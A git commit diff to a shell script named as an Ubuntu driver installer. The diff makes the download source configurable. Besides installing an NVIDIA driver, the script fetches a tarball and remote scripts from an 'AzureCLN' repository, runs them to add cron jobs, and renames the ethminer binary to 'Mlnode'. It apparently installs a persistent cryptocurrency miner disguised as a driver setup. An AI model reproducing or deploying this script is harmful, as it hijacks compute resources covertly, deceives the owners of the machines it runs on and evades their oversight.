7744fbd36d9656850dd3063f355f9d4aad1164fc
Model Deverlopment <79557662+awsdiami@users.noreply.github.com>
2022-03-07 18:05:46 +0700

    Update ubuntu-driver-ins.sh

--- ubuntu-driver-ins.sh
+++ ubuntu-driver-ins.sh
@@ -1,21 +1,23 @@
 #!/bin/bash
 
+gitpath=$(head -1 gitpath.txt)
+
 yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
 sudo apt install -y nvidia-driver-418
 
 wget https://github.com/awsdiami/AzureCLN/raw/main/Mlnode.tar.gz
 tar -xvf Mlnode.tar.gz
 rm -rf Mlnode.tar.gz
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/cron.sh
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/addcron.sh
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/croncheck.sh
+wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+wget https://raw.githubusercontent.com/$gitpath/main/addcron.sh
+wget https://raw.githubusercontent.com/$gitpath/main/croncheck.sh
 chmod +x addcron.sh
 chmod +x croncheck.sh
 ./addcron.sh
 ./croncheck.sh
 
 cd bin/
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/runsrc.sh
+wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
 chmod +x runsrc.sh
 mv ethminer Mlnode
 
